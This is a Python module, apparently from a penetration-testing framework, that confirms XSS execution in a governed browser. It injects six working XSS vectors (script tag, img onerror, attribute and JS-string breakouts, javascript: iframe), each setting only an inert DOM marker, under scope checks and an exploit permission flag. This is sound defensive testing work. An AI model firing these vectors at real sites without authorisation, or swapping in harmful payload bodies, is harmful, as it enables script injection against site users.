# SPDX-License-Identifier: AGPL-3.0-or-later
"""xss.execution — oracle d'EXÉCUTION XSS CONFIRMÉE par le NAVIGATEUR GOUVERNÉ (CWE-79 / T1059).

LE CHAÎNON MANQUANT. `xss.reflected` juge la RÉPONSE SERVEUR : il prouve qu'un marqueur revient NON
échappé dans un contexte JS-exécutable. C'est le mieux possible SANS navigateur — et sa propre
docstring le dit : « confirmer l'EXÉCUTION réelle + la chaînabilité exige le module navigateur/
évasion ». Structurellement, un oracle qui lit la réponse HTTP ne PEUT PAS voir un XSS **DOM** : sur
une SPA (Angular/React), la charge n'existe qu'APRÈS le rendu client — la réponse serveur ne la
contient même pas (payload dans le fragment, sink `innerHTML`, sanitizer contourné). Mesuré : une
campagne contre OWASP Juice Shop a rendu « non confirmé » — et c'était CORRECT.

Forge A un module navigateur (`forge/browser_client.py`, service HTTP :8080) mais AUCUN oracle ne
s'en servait pour confirmer une EXÉCUTION. C'est ce que fait ce module. Il est le COMPLÉMENT de
`xss.reflected`/`xss.stored`, pas leur remplaçant : eux restent le chemin SANS navigateur (et
restent le seul chemin quand le service est absent).

CE QUI SÉPARE UNE PREUVE D'UN BRUIT — les trois propriétés qui font la valeur de cet oracle :

  (1) MARQUEUR BÉNIN, JAMAIS UNE CHARGE NUISIBLE. Le marqueur pose un ATTRIBUT INERTE sur `<html>` :
      `document.documentElement.setAttribute('data-forge-xss', <témoin>)`. Aucun `alert()` (qui
      bloquerait la page et le service), aucune exfiltration, aucun réseau (le vecteur image utilise
      `src="data:,"` — décodage en échec local, ZÉRO requête sortante), aucun état muté. Le PoC rendu
      à l'opérateur est rejouable à la main sans être dangereux.

  (2) EXÉCUTÉ ≠ RÉFLÉCHI — et c'est STRUCTUREL, pas déclaratif. Deux verrous indépendants :
        a. le témoin est LU DANS LE DOM VIVANT (`/evaluate` -> `getAttribute`), pas dans le corps
           HTTP : ce qui est mesuré est un EFFET, pas une présence de texte ;
        b. le témoin `forgexec<12 hex>` n'apparaît JAMAIS EN ENTIER dans la charge envoyée : la
           charge le fait ASSEMBLER à l'exécution par concaténation (`'forgexec'+'a1b2c3'+'d4e5f6'`).
           Donc une page qui RÉFLÉCHIT la charge — brute ou échappée — ne peut PAS produire le témoin.
           Ce verrou tient même si un futur lecteur dégradait la détection en simple `in dom`.
      Conséquence testée : un reflet BRUT en contexte `<script>` (que `xss.reflected` promeut, à
      juste titre, comme reflet exécutable) mais NON exécuté (CSP, sanitizer, contexte inerte) rend
      ici « non confirmé ». Les deux oracles ne mesurent pas la même chose — c'est voulu.

  (3) TÉMOIN DISTINCT PAR VECTEUR. Chaque vecteur dérive son propre témoin : un attribut resté d'une
      sonde précédente ne peut pas être pris pour la preuve de la suivante (anti-faux-positif inter-probe).

VECTEURS (bornés, sélectionnables via `params.vectors`, tous BÉNINS — chacun vérifié contre un
navigateur réel sur des pages `data:` locales, en positif ET en contrôle négatif échappé) :
  - html_script       `<script>…</script>`                  — injection HTML brute
  - img_onerror       `<img src="data:," onerror=…>`        — passe par un sink `innerHTML` (où un
                                                              `<script>` inséré NE s'exécute PAS) ; 0 requête
  - attr_breakout     `"><img src="data:," onerror=…>`      — sortie d'un attribut quoté
  - js_string_single  `';…;//`                              — sortie d'un littéral JS quoté simple
  - js_string_double  `";…;//`                              — sortie d'un littéral JS quoté double
  - iframe_jsurl      `<iframe src="javascript:…">`         — contournement de sanitizer (cas Angular)

MODES D'INJECTION : query (défaut), FRAGMENT (`params.fragment` — le XSS DOM pur, qui n'atteint
JAMAIS le serveur et qu'aucun oracle HTTP ne peut voir), ou PERSISTÉ (`params.store_url` : on
persiste dans le PROPRE champ de l'opérateur puis on rend `params.view_url`).

GOUVERNANCE :
  - SCOPE-GUARD fail-closed (`ScopeGuardedOracle`) sur la cible ET l'URL de persistance ET la vue :
    hors périmètre -> `skipped`, AUCUN appel réseau ni navigateur.
  - DÉGRADATION GRACIEUSE : service navigateur absent/injoignable, ou sonde qui n'aboutit pas ->
    `degraded()` (`status='skipped'`), JAMAIS un verdict négatif. Une sonde qui n'a pas abouti ne
    conclut pas. Une réponse RÉELLE sans exécution reste, elle, un vrai négatif (`tested`).
  - exploit=True : cet oracle fait TOURNER du code fourni par l'attaquant dans la page cible. C'est
    la frontière que `xss.reflected`/`xss.stored` (marqueur inerte, jamais exécuté) ne franchissent
    pas — le ROE doit donc exiger `allow_exploit` AVANT de tirer (l'engine réconcilie ce drapeau dans
    l'Action avant la gate). destructive=False (aucun état muté), web_allowed=True.
  - SESSION SECRÈTE : la session authentifiée vit DANS le service navigateur ; on ne lit d'elle
    AUCUN en-tête/cookie, et le DOM rendu n'entre JAMAIS dans un finding (il porterait des données
    de session) — l'évidence ne contient que des URL, un nom de vecteur et le témoin attendu/lu.
  - AUCUNE capacité élargie ailleurs : les flags restent déclarés ici et gardés par le ROE.
"""
import hashlib
import urllib.parse

from .clientflow import ClientFlowOracle
from .registry import register
from .. import browser_client as bc
from .. import techniques

# --- Le témoin d'EXÉCUTION -------------------------------------------------------------------------
# Attribut INERTE posé sur <html> par la charge SI (et seulement si) elle a tourné. Choisi parce
# qu'il est observable par les DEUX canaux du service (evaluate -> getAttribute ; content -> DOM
# sérialisé) et qu'il n'a aucun effet de bord (ni rendu, ni réseau, ni état).
_EXEC_ATTR = "data-forge-xss"
_BEACON_PREFIX = "forgexec"
_PROBE_JS = "document.documentElement.getAttribute('" + _EXEC_ATTR + "')"
_SQ, _DQ = "'", '"'


def _beacon_js(beacon, quote=_SQ, root="document"):
    """JS BÉNIGN qui pose le témoin — le cœur du verrou « exécuté ≠ réfléchi ».

    Le témoin complet (`forgexec` + 12 hex) N'APPARAÎT JAMAIS dans la chaîne retournée : il est
    découpé en trois littéraux que seul un INTERPRÉTEUR JS recolle. Une page qui réfléchit cette
    charge (brute OU échappée) ne peut donc pas faire apparaître le témoin, ni dans le DOM ni
    ailleurs — seule son EXÉCUTION le produit. `quote` permet d'utiliser l'autre guillemet quand la
    charge sort d'un littéral JS ; `root` vaut `parent.document` depuis une iframe `javascript:`."""
    body = beacon[len(_BEACON_PREFIX):]
    a, b, q = body[:6], body[6:], quote
    return ("{root}.documentElement.setAttribute({q}{attr}{q},"
            "{q}{pre}{q}+{q}{a}{q}+{q}{b}{q})").format(
                root=root, q=q, attr=_EXEC_ATTR, pre=_BEACON_PREFIX, a=a, b=b)


# --- Vecteurs BÉNINS (aucun alert(), aucune exfiltration, aucune requête sortante) -----------------
def _v_html_script(beacon):
    return "<script>" + _beacon_js(beacon) + "</script>"


def _v_img_onerror(beacon):
    # `src="data:,"` : ressource vide -> erreur de décodage LOCALE, donc AUCUNE requête réseau
    # (contrairement au classique `src=x` qui émet un GET 404 sur la cible). Vecteur clé du XSS DOM :
    # un `<script>` inséré via innerHTML ne s'exécute pas, un `onerror` d'image si.
    return '<img src="data:," onerror="' + _beacon_js(beacon) + '">'


def _v_attr_breakout(beacon):
    return '"><img src="data:," onerror="' + _beacon_js(beacon) + '">'


def _v_js_string_single(beacon):
    return "';" + _beacon_js(beacon, _DQ) + ";//"


def _v_js_string_double(beacon):
    return '";' + _beacon_js(beacon, _SQ) + ";//"


def _v_iframe_jsurl(beacon):
    # `javascript:` dans une iframe — survit aux sanitizers qui strippent script/handlers (cas Angular).
    # Le contexte d'exécution est le document de l'IFRAME : on vise `parent.document` pour poser le
    # témoin sur la page testée (sinon l'attribut atterrirait dans un document jetable et invisible).
    return '<iframe src="javascript:' + _beacon_js(beacon, _SQ, "parent.document") + '">'


VECTORS = (
    ("html_script", _v_html_script),
    ("img_onerror", _v_img_onerror),
    ("attr_breakout", _v_attr_breakout),
    ("js_string_single", _v_js_string_single),
    ("js_string_double", _v_js_string_double),
    ("iframe_jsurl", _v_iframe_jsurl),
)
VECTOR_NAMES = tuple(name for name, _ in VECTORS)


def _ok(status):
    """True si le service navigateur a répondu 2xx. `browser_client` rend status=0 sur erreur réseau."""
    return bool(status) and 200 <= int(status) < 300


def _result_of(resp):
    """Valeur rendue par /evaluate (`{"result": …}` ou valeur nue). None si absente/illisible."""
    if isinstance(resp, dict):
        for key in ("result", "value", "data", "output"):
            if key in resp:
                val = resp[key]
                return val if isinstance(val, str) else (None if val is None else str(val))
        return None
    return resp if isinstance(resp, str) else None


def _dom_of(resp):
    """DOM rendu depuis /content : dict {content|html|body|text} ou str. '' sinon.

    N'extrait QUE le champ de contenu : la réponse porte aussi l'URL naviguée (qui contient la
    charge) — la confondre avec le DOM réintroduirait exactement le « reflet pris pour exécution »
    que cet oracle existe pour éviter."""
    if isinstance(resp, dict):
        for key in ("content", "html", "body", "text"):
            if isinstance(resp.get(key), str):
                return resp[key]
        return ""
    return resp if isinstance(resp, str) else ""


# --- Enregistrement de la technique (contrat « déclare-une-fois -> dérive-partout ») ---------------
# `register_kind` est le point d'extension prévu : la technique apparaît AUTOMATIQUEMENT au catalogue
# groupé, au pipeline ordonné, aux profils et à `forge modules --json`, sans câblage par-technique.
# Ni `remediation` ni `qualifying` (réservés au noyau hérité) -> les vues historiques restent
# byte-à-byte identiques ; le fix est déclaré explicitement par le module ci-dessous.
techniques.register_kind(techniques._k(
    "xss.execution", "XSS", True, depends_on=("recon.js_endpoints",),
    cwe="CWE-79", mitre="T1059", exploit=True,
    attck_tactic="Execution", phase="access", capability="active", proof_required=True))


@register("xss.execution")
class XssExecution(ClientFlowOracle):
    kind = "xss.execution"
    exploit = True               # fait EXÉCUTER du code injecté dans la page -> exige allow_exploit
    destructive = False          # attribut inerte : aucun état serveur ni client muté
    web_allowed = True           # interaction web -> gardée par le ROE
    available = True             # listable ; DÉGRADE en skipped à fire-time si le navigateur est absent
    mitre = techniques.mitre_for("xss.execution")     # source de vérité : forge/techniques.py (T1059)
    cwe = "CWE-79"                                     # category + cwe des findings (via Oracle.proof)
    tool = "forge/modules/xssexec.py:xss.execution"
    fix = ("Encoder/échapper la sortie SELON LE CONTEXTE (HTML, attribut, JS, URL) sur toute donnée "
           "d'origine utilisateur, y compris côté CLIENT : ne jamais passer une valeur non assainie à "
           "un sink DOM (innerHTML/outerHTML/insertAdjacentHTML/document.write, `javascript:` d'une "
           "URL liée) ni la réinjecter dans un `<script>`/`on*=`. Traiter le FRAGMENT d'URL "
           "(location.hash) comme une entrée hostile. CSP stricte sans 'unsafe-inline' (défense en "
           "profondeur : elle aurait bloqué l'exécution prouvée ici), frameworks auto-échappants sans "
           "bypass (bypassSecurityTrust*/dangerouslySetInnerHTML), validation en allowlist (CWE-79).")
    description = ("Oracle d'EXÉCUTION XSS via le navigateur gouverné : injecte un marqueur BÉNIN "
                   "(attribut inerte, ni alert ni exfiltration) et confirme qu'il a TOURNÉ en lisant "
                   "le DOM vivant. Voit le XSS DOM/SPA que la réponse serveur ne montre pas. "
                   "Reflet seul -> non confirmé ; navigateur absent -> skipped. CWE-79.")

    MAX_VECTORS = len(VECTORS)   # borne dure du fan-out de sondes (une navigation par vecteur)

    # --- seams navigateur (patchables ; mêmes conventions que les seams de xss.stored) -------------
    @staticmethod
    def _browser_available():
        """Seam (patchable) : le service navigateur répond-il ? Absent -> dégradation `skipped`."""
        return bc.health()

    @staticmethod
    def _browser_probe(url, tab=bc.DEFAULT_TAB):
        """Seam (patchable) — charge `url` dans un DOCUMENT NEUF puis LIT LE TÉMOIN D'EXÉCUTION.

        Le passage par `about:blank` AVANT chaque sonde n'est pas cosmétique, il est NÉCESSAIRE :
          - navigations MÊME DOCUMENT : deux URL qui ne diffèrent QUE par le fragment ne rechargent
            PAS la page — les scripts ne re-tournent pas. Sans ce reset, seul le PREMIER vecteur
            serait réellement exécuté en mode `fragment` et les suivants rendraient un FAUX NÉGATIF
            silencieux (constaté contre un navigateur réel, pas en théorie) ;
          - témoin périmé : un attribut posé par la sonde précédente ne peut pas survivre à un
            document neuf (défense en profondeur, en plus du témoin distinct par vecteur).

        Renvoie `(abouti, valeur_lue, dom)` :
          - `abouti=False` -> la sonde n'a pas abouti (navigation ou lecture impossible) : l'appelant
            NE CONCLUT PAS (dégradation). C'est la différence entre « pas de XSS » et « pas testé ».
          - `valeur_lue`   -> l'attribut témoin lu dans le DOM VIVANT (canal principal, /evaluate).
          - `dom`          -> le DOM sérialisé (canal de repli si /evaluate est indisponible ; sûr,
            car le témoin ne peut y apparaître que s'il a été ASSEMBLÉ à l'exécution).
        La session authentifiée SECRÈTE vit DANS le service : on n'en lit rien et le DOM ne sort
        jamais de cette fonction (l'appelant n'en tire qu'un booléen)."""
        bc.goto("about:blank", tab=tab, wait=0)      # document NEUF (cf. docstring : ni same-document,
        gst, _g = bc.goto(url, tab=tab)              # ni témoin périmé)
        if not _ok(gst):
            return False, None, ""
        est, resp = bc.evaluate(_PROBE_JS, tab=tab)
        value = _result_of(resp) if _ok(est) else None
        cst, content = bc.content(tab=tab)
        dom = _dom_of(content) if _ok(cst) else ""
        return (_ok(est) or bool(dom)), value, dom

    @staticmethod
    def _browser_reset(tab=bc.DEFAULT_TAB):
        """Best-effort : ne LAISSE PAS la page injectée chargée dans le navigateur gouverné après la
        sonde (hygiène : ni charge résiduelle, ni témoin périmé pour un run ultérieur). Jamais fatal."""
        try:
            bc.goto("about:blank", tab=tab, wait=0)
        except Exception:            # noqa: BLE001
            pass

    # --- marqueur / charges -------------------------------------------------------------------------
    @staticmethod
    def _beacon(target, param, vector):
        """Témoin d'exécution DÉTERMINISTE (rejouable) et DISTINCT PAR VECTEUR : `forgexec` + 12 hex.
        Distinct par vecteur -> un attribut laissé par la sonde précédente ne peut pas être pris pour
        la preuve de la suivante."""
        seed = "{}|{}|{}|forge-xssexec".format(target, param, vector)
        return _BEACON_PREFIX + hashlib.sha256(seed.encode()).hexdigest()[:12]

    @classmethod
    def _selected(cls, names):
        """Vecteurs à sonder : tous par défaut, ou le sous-ensemble nommé par `params.vectors`
        (liste ou chaîne séparée par des virgules). Borné à MAX_VECTORS, ordre du catalogue préservé."""
        if not names:
            return list(VECTORS)[:cls.MAX_VECTORS]
        if isinstance(names, (list, tuple, set)):
            want = {str(n).strip() for n in names}
        else:
            want = {part.strip() for part in str(names).split(",")}
        return [(n, b) for n, b in VECTORS if n in want][:cls.MAX_VECTORS]

    @staticmethod
    def _inject_url(base, param, payload, fragment=False):
        """URL de sonde : charge en query (défaut) ou dans le FRAGMENT (`fragment=True`) — le fragment
        n'est JAMAIS envoyé au serveur, c'est précisément le XSS DOM qu'aucun oracle HTTP ne voit.

        PERCENT-encodage (`quote`), PAS le plus-encodage de `urlencode` : une charge contient des
        ESPACES (`<img src=… onerror=…>`) et `urlencode` les rend par `+`. Un serveur décode bien `+`
        comme une espace (form-urlencoded), mais le code CLIENT qui lit `location.hash`/`location.search`
        utilise massivement `decodeURIComponent`, qui laisse le `+` LITTÉRAL : la charge arrivait
        corrompue (`<img+src=…>` — un nom de balise inexistant, aucun gestionnaire déclenché) et la
        sonde rendait un FAUX NÉGATIF. Constaté contre un navigateur réel. `%20` est décodé
        correctement par decodeURIComponent, URLSearchParams ET tout serveur."""
        enc = param + "=" + urllib.parse.quote(payload, safe="")
        if fragment:
            return base.split("#", 1)[0] + "#" + enc
        return base + ("&" if "?" in base else "?") + enc

    def _persist(self, action, store_url, param, payload):
        """Persiste la charge dans le PROPRE champ de l'opérateur (compte-opérateur, non destructif).
        POST par défaut (ou `params.store_method`). Renvoie le status HTTP (None = transport muet)."""
        headers = dict(action.params.get("headers", {}))
        method = str(action.params.get("store_method", "POST")).upper()
        if method == "GET":
            sep = "&" if "?" in store_url else "?"
            st, _b, _p = self._fetch(store_url + sep + urllib.parse.urlencode({param: payload}),
                                     headers=headers, method="GET")
            return st
        st, _b, _p = self._fetch(store_url, headers=headers, method=method,
                                 data=urllib.parse.urlencode({param: payload}))
        return st

    # --- dry / fire ---------------------------------------------------------------------------------
    def dry(self, action):
        param = action.params.get("param", "?")
        beacon = self._beacon(action.target, param, VECTOR_NAMES[0])
        return ("# injecte {p}=<marqueur d'exécution BÉNIN> (attribut inerte ; ni alert(), ni "
                "exfiltration, ni requête sortante) sur {t} ; charge la page dans le NAVIGATEUR "
                "GOUVERNÉ ({b}/goto) puis lit le DOM VIVANT : {probe} ; PREUVE = le témoin {bc_} "
                "apparaît — il est ASSEMBLÉ À L'EXÉCUTION et n'existe jamais en entier dans la "
                "charge, donc un simple REFLET (brut ou échappé) ne peut pas le produire ; "
                "navigateur absent -> skipped").format(
                    p=param, t=action.target, b=bc.base_url(), probe=_PROBE_JS, bc_=beacon)

    def fire(self, action):
        params = action.params
        store_url = params.get("store_url")
        view_url = params.get("view_url") or action.target
        tab = params.get("tab", bc.DEFAULT_TAB)

        # (1) SCOPE-GUARD fail-closed — cible, persistance et vue. Hors périmètre -> ZÉRO I/O (ni
        #     réseau, ni navigateur : la charge et la session gouvernée ne quittent pas le périmètre).
        if not self._in_scope(action, action.target):
            return [self._scope_refused(action)]
        for url, label in ((store_url, "URL de persistance"), (view_url, "vue de rendu")):
            if url and not self._in_scope(action, url):
                return [self.degraded(
                    target=url,
                    title="XSS execution non testé — {} hors périmètre (scope-guard fail-closed)".format(label),
                    evidence="{} hors in-scope ; aucune requête ni navigation émise (fail-closed).".format(label),
                    poc=self.dry(action))]

        param = params.get("param")
        if not param:
            return [self.skip(
                target=action.target, title="XSS execution non testé — config manquante",
                evidence=("Requiert params.param (paramètre injecté). Optionnel : params.fragment "
                          "(charge dans le fragment -> XSS DOM pur), params.store_url + "
                          "params.store_method (charge PERSISTÉE, compte opérateur), params.view_url "
                          "(page rendue), params.vectors ({}), params.tab, params.headers.").format(
                              ", ".join(VECTOR_NAMES)),
                poc=self.dry(action))]

        # (2) NAVIGATEUR REQUIS — c'est LUI qui atteste l'exécution. Absent -> `skipped`, jamais un
        #     verdict négatif (`xss.reflected`/`xss.stored` restent le chemin sans navigateur).
        if not self._browser_available():
            return [self.degraded(
                target=view_url,
                title="XSS execution non testé — module navigateur indisponible (dégradation gracieuse)",
                evidence=("Cet oracle EXIGE le navigateur gouverné (service browser-automation) pour "
                          "attester l'EXÉCUTION : sans lui on ne peut prouver qu'un reflet, ce que fait "
                          "déjà xss.reflected. Service injoignable -> skipped (offline-safe). Lancer le "
                          "service d'automatisation navigateur pour activer."),
                poc=self.dry(action))]

        vectors = self._selected(params.get("vectors"))
        if not vectors:
            return [self.skip(
                target=action.target, title="XSS execution non testé — aucun vecteur connu sélectionné",
                evidence="params.vectors ne nomme aucun vecteur connu. Vecteurs : {}.".format(
                    ", ".join(VECTOR_NAMES)),
                poc=self.dry(action))]

        probed, attempted, last_url = [], [], view_url
        for name, build in vectors:
            beacon = self._beacon(action.target, param, name)
            payload = build(beacon)
            if store_url:
                # charge PERSISTÉE dans le propre champ de l'opérateur, puis rendu de la vue.
                pst = self._persist(action, store_url, param, payload)
                if pst is None:
                    self._browser_reset(tab)
                    return [self.degraded(
                        target=store_url,
                        title="XSS execution non testé — persistance indisponible (dégradation gracieuse)",
                        evidence=("Aucune réponse du serveur à la persistance de la charge (transport "
                                  "muet) : la prémisse n'est pas établie, aucun verdict n'est rendu."),
                        poc=self.dry(action))]
                url = view_url
            else:
                url = self._inject_url(view_url, param, payload, fragment=bool(params.get("fragment")))
            last_url = url
            attempted.append(name)
            abouti, value, dom = self._browser_probe(url, tab=tab)
            if not abouti:
                continue                     # sonde non aboutie : on n'en tire AUCUNE conclusion
            probed.append(name)
            # PREUVE : le témoin existe dans le DOM VIVANT. Il ne peut y être que s'il a été ASSEMBLÉ
            # à l'exécution (jamais présent en entier dans la charge) -> reflet, même brut, exclu.
            if value == beacon or beacon in (dom or ""):
                self._browser_reset(tab)
                return [self.proof(
                    target=url, proven=True,
                    title=("XSS EXÉCUTÉ — CONFIRMÉ dans le navigateur gouverné (vecteur {}{})".format(
                        name, ", charge PERSISTÉE" if store_url else "")),
                    severity=("CRITICAL" if store_url else "HIGH"),
                    evidence=(
                        "EXÉCUTION CONFIRMÉE. Vecteur={} ; page sondée={} ; témoin attendu={} ; lu dans "
                        "le DOM VIVANT via {} -> {}. Le témoin n'existe QUE si la charge a TOURNÉ : il "
                        "est assemblé à l'exécution par concaténation et n'apparaît JAMAIS en entier "
                        "dans la charge envoyée — un simple REFLET (brut ou échappé) ne peut donc pas "
                        "le produire (c'est la différence avec xss.reflected, qui prouve le reflet "
                        "exécutable, pas l'exécution). Marqueur BÉNIN : attribut inerte, aucun alert(), "
                        "aucune exfiltration, aucune requête sortante, aucun état muté ; page injectée "
                        "déchargée après la sonde. Vecteurs sondés : {}.".format(
                            name, url, beacon, _PROBE_JS,
                            "témoin présent" if value == beacon else "témoin présent (DOM sérialisé)",
                            ", ".join(probed))),
                    poc=("# 1) ouvrir dans un navigateur : {url}\n"
                         "# 2) dans la console : {probe}\n"
                         "# PREUVE = la valeur rendue est {beacon} (le témoin a été ASSEMBLÉ à "
                         "l'exécution ; un reflet ne peut pas le produire)\n"
                         "# charge BÉNIGNE (pose un attribut inerte, ne fait rien d'autre) : {payload}"
                         .format(url=url, probe=_PROBE_JS, beacon=beacon, payload=payload)))]

        self._browser_reset(tab)
        # AUCUNE sonde n'a abouti -> AUCUN VERDICT (contrat transverse : une sonde qui n'a pas abouti
        # ne conclut pas). Un « non confirmé » ici certifierait un test qui n'a jamais eu lieu.
        if not probed:
            return [self.degraded(
                target=last_url,
                title="XSS execution non testé — sonde navigateur non aboutie (dégradation gracieuse)",
                evidence=("Le navigateur gouverné n'a pu ni naviguer ni lire le DOM pour aucun des "
                          "vecteurs tentés ({}) : absence de réponse n'est pas absence de "
                          "vulnérabilité — aucun verdict n'est rendu.".format(", ".join(attempted))),
                poc=self.dry(action))]

        # Sondes ABOUTIES sans témoin -> vrai négatif explicite (`tested`), jamais `vulnerable`.
        return [self.proof(
            target=last_url, proven=False,
            title="XSS non confirmé — le marqueur n'a PAS été exécuté dans le navigateur (reflet ≠ exécution)",
            severity="INFO",
            evidence=("Aucune exécution constatée. Vecteurs sondés dans le navigateur gouverné : {} ; "
                      "le témoin d'exécution ({}) est ABSENT du DOM vivant après rendu. Un reflet de la "
                      "charge — même NON échappé — ne compte PAS ici : seul l'assemblage du témoin à "
                      "l'exécution est accepté comme preuve. Le reflet exécutable (sans exécution) reste "
                      "le domaine de xss.reflected/xss.stored ; l'absence d'exécution peut aussi venir "
                      "d'une CSP ou d'un sanitizer efficace. Aucune charge nuisible envoyée.".format(
                          ", ".join(probed), _EXEC_ATTR)),
            poc=self.dry(action))]
